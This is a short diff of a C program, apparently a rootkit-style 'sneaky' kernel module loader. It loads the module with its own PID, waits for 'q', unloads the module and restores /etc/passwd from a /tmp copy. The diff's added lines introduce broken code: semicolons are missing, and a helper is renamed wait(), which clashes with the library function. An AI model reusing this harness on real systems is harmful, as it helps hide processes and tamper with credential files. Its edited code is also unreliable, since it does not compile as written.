@@ -14,7 +14,7 @@ void insert_sneaky_mod(int sneaky_pid) {
 
   if(pid > 0)
   {
-    waitpid(pid, NULL, 0);
+    waitpid(pid, NULL, 0)
   }
   else if(pid == 0)
   {
@@ -30,7 +30,7 @@ void insert_sneaky_mod(int sneaky_pid) {
   }
 }
 
-void waitq() {
+void wait() {
   char c;
   while ((c = getchar()) != 'q') {
   }
@@ -63,10 +63,10 @@ int main() {
   // Step 3: load the sneaky module
   insert_sneaky_mod(getpid());
   // Step 4: wait for 'q'
-  waitq();
+  wait();
   // Step5: 
-  remove_sneaky_mod();
-  system("cp /tmp/passwd /etc/passwd");
+  remove_sneaky_mod()
+  system("cp /tmp/passwd /etc/passwd")
   system("rm /tmp/passwd");
 
   return EXIT_SUCCESS;
